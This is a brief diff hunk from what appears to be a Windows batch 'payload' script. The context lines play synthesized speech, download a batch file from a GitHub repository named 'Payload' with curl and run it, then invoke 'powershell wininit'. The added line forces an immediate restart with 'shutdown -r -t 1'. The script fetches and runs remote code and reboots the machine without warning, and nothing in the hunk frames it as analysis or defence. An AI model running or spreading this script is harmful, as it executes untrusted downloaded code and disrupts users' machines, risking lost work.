@@ -4,4 +4,5 @@ PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object S
 curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat
 start soundplayer.bat
 timeout 20
+shutdown -r -t 1
 powershell wininit
